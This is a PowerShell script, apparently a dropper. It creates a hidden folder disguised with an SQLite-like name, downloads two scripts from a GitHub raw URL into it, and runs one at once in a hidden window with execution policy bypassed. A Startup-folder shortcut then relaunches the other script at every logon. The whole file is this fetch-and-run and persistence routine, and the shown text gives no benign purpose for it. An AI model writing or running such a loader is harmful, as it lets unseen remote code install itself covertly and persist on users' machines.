$url = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/setup.ps1"
$hiddenFolderPath = "$env:LOCALAPPDATA\HiddenSqliteFolder"
$setupScriptPath = Join-Path $hiddenFolderPath "setup.ps1"
if (-not (Test-Path $hiddenFolderPath)) {
    New-Item -ItemType Directory -Path $hiddenFolderPath -Force | Out-Null
    Set-ItemProperty -Path $hiddenFolderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
}
Invoke-WebRequest -Uri $url -OutFile $setupScriptPath
Invoke-WebRequest -Uri https://raw.githubusercontent.com/N8crawler2139/MyCode/main/startup -OutFile "$env:LOCALAPPDATA\HiddenSqliteFolder\startup.ps1"

$ShortcutPath = [System.IO.Path]::Combine([Environment]::GetFolderPath('Startup'), 'MyStartupScript.lnk')
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$($env:LOCALAPPDATA)\HiddenSqliteFolder\startup.ps1`""
$Shortcut.IconLocation = "powershell.exe"
$Shortcut.WorkingDirectory = $PSScriptRoot
$Shortcut.Save()

Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$setupScriptPath`"" -WindowStyle Hidden
